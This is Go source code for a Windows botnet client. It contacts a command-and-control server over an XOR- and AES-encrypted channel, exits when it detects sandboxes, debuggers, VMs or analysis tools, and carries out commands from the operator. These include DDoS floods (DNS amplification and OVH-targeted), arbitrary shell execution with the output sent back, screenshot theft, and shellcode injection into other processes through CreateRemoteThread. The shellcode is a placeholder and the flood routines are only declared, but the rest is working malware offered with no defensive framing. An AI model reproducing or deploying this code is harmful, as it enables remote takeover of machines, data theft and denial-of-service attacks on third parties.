package main

/*
#include <stdlib.h>
void dnsamp_attack(const char* target_ip, int duration);
void ovh_attack(const char* target_ip, int port, int duration);
void ovhack_attack(const char* target_ip, int port, int duration);
*/
import "C"

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"encoding/base64"
	"fmt"
	"image/png"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
)

var cncAddr = "127.0.0.1:1337"
var aesKey = []byte("ilovepornnet1234")

func xor(data []byte, key byte) []byte {
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key
	}
	return out
}

func pad(data []byte, blockSize int) []byte {
	padLen := blockSize - (len(data) % blockSize)
	return append(data, bytes.Repeat([]byte{byte(padLen)}, padLen)...)
}

func unpad(data []byte) []byte {
	if len(data) == 0 {
		return data
	}
	padLen := int(data[len(data)-1])
	if padLen > len(data) {
		return data
	}
	return data[:len(data)-padLen]
}

func encryptMessage(msg string) string {
	plaintext := xor([]byte(msg), 0x37)
	padded := pad(plaintext, 16)
	block, _ := aes.NewCipher(aesKey)
	encrypted := make([]byte, len(padded))
	for i := 0; i < len(padded); i += 16 {
		block.Encrypt(encrypted[i:i+16], padded[i:i+16])
	}
	return base64.StdEncoding.EncodeToString(encrypted)
}

func decryptMessage(enc string) string {
	data, err := base64.StdEncoding.DecodeString(enc)
	if err != nil {
		return ""
	}
	block, _ := aes.NewCipher(aesKey)
	decrypted := make([]byte, len(data))
	for i := 0; i < len(data); i += 16 {
		block.Decrypt(decrypted[i:i+16], data[i:i+16])
	}
	unpadded := unpad(decrypted)
	return string(xor(unpadded, 0x37))
}

func sendMessage(conn net.Conn, msg string) {
	enc := encryptMessage(msg)
	conn.Write([]byte(enc + "\n"))
}

func isSandbox() bool {
	return isDebuggerPresent() || isSandboxUser() || isRunningInVM() || isLowSpecSystem() || isAnalysisToolRunning()
}

func isDebuggerPresent() bool {
	modkernel32 := syscall.NewLazyDLL("kernel32.dll")
	proc := modkernel32.NewProc("IsDebuggerPresent")
	ret, _, _ := proc.Call()
	return ret != 0
}

func isSandboxUser() bool {
	suspicious := []string{"sandbox", "malware", "analyst", "test", "debug"}
	user := strings.ToLower(os.Getenv("USERNAME"))
	for _, bad := range suspicious {
		if strings.Contains(user, bad) {
			return true
		}
	}
	return false
}

func isRunningInVM() bool {
	files := []string{
		"C:\\windows\\system32\\drivers\\vmmouse.sys",
		"C:\\windows\\system32\\drivers\\vmhgfs.sys",
		"C:\\windows\\system32\\drivers\\VBoxMouse.sys",
		"C:\\windows\\system32\\drivers\\VBoxGuest.sys",
		"C:\\windows\\system32\\drivers\\qemu-ga.sys",
	}
	for _, f := range files {
		if _, err := os.Stat(f); err == nil {
			return true
		}
	}
	return false
}

func isLowSpecSystem() bool {
	return runtime.NumCPU() <= 1
}

func isAnalysisToolRunning() bool {
	tools := []string{"wireshark.exe", "fiddler.exe", "procmon.exe", "ida.exe", "ollydbg.exe"}
	output, _ := exec.Command("tasklist").Output()
	running := strings.ToLower(string(output))
	for _, t := range tools {
		if strings.Contains(running, t) {
			return true
		}
	}
	return false
}

func captureScreenshot() string {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		return "screenshot failed"
	}
	buf := new(bytes.Buffer)
	png.Encode(buf, img)
	encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
	return encoded
}

var (
	kernel32               = syscall.NewLazyDLL("kernel32.dll")
	procOpenProcess        = kernel32.NewProc("OpenProcess")
	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	procCloseHandle        = kernel32.NewProc("CloseHandle")
)

const (
	PROCESS_ALL_ACCESS      = 0x1F0FFF
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

func InjectProcess(pid uint32, shellcode []byte) error {
	hProcess, _, err := procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
	if hProcess == 0 {
		return fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer procCloseHandle.Call(hProcess)

	addr, _, err := procVirtualAllocEx.Call(hProcess, 0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	var written uintptr
	ret, _, err := procWriteProcessMemory.Call(hProcess, addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), uintptr(unsafe.Pointer(&written)))
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	thread, _, err := procCreateRemoteThread.Call(hProcess, 0, 0, addr, 0, 0, 0)
	if thread == 0 {
		return fmt.Errorf("CreateRemoteThread failed: %v", err)
	}

	return nil
}

func getShellcode() []byte {
	return []byte{
		0x90, 0x90, 0x90, 0x90,
	}
}

func handleCommand(conn net.Conn, line string) {
	line = strings.TrimSpace(line)

	switch {
	case strings.HasPrefix(line, "dnsamp"):
		parts := strings.Split(line, " ")
		if len(parts) >= 3 {
			target := C.CString(parts[1])
			dur := C.int(atoi(parts[2]))
			go C.dnsamp_attack(target, dur)
		} else {
			sendMessage(conn, "usage: dnsamp <target_ip> <duration>")
		}
	case strings.HasPrefix(line, "ovh"):
		parts := strings.Split(line, " ")
		if len(parts) >= 4 {
			ip := C.CString(parts[1])
			port := C.int(atoi(parts[2]))
			dur := C.int(atoi(parts[3]))
			go C.ovh_attack(ip, port, dur)
		} else {
			sendMessage(conn, "usage: ovh <target_ip> <port> <duration>")
		}
	case strings.HasPrefix(line, "ovhack"):
		parts := strings.Split(line, " ")
		if len(parts) >= 4 {
			ip := C.CString(parts[1])
			port := C.int(atoi(parts[2]))
			dur := C.int(atoi(parts[3]))
			go C.ovhack_attack(ip, port, dur)
		} else {
			sendMessage(conn, "usage: ovhack <target_ip> <port> <duration>")
		}
	case strings.HasPrefix(line, "exec "):
		cmd := strings.TrimPrefix(line, "exec ")
		out, err := exec.Command("cmd", "/C", cmd).CombinedOutput()
		if err != nil {
			sendMessage(conn, "exec error: "+err.Error())
		} else {
			sendMessage(conn, string(out))
		}
	case line == "screenshot":
		encoded := captureScreenshot()
		sendMessage(conn, encoded)
	case strings.HasPrefix(line, "inject "):
		parts := strings.Split(line, " ")
		if len(parts) < 2 {
			sendMessage(conn, "usage: inject <pid>")
			return
		}
		pid64, err := strconv.ParseUint(parts[1], 10, 32)
		if err != nil {
			sendMessage(conn, "Invalid PID")
			return
		}
		pid := uint32(pid64)
		shellcode := getShellcode()
		err = InjectProcess(pid, shellcode)
		if err != nil {
			sendMessage(conn, "Injection failed: "+err.Error())
		} else {
			sendMessage(conn, "Injection succeeded")
		}
	default:
		sendMessage(conn, "[BOT] Unknown command")
	}
}

func atoi(s string) int {
	i, _ := strconv.Atoi(s)
	return i
}

func main() {
	if isSandbox() {
		os.Exit(0)
	}
	for {
		conn, err := net.Dial("tcp", cncAddr)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		scanner := bufio.NewScanner(conn)
		for scanner.Scan() {
			line := decryptMessage(scanner.Text())
			go handleCommand(conn, line)
		}
		conn.Close()
	}
}
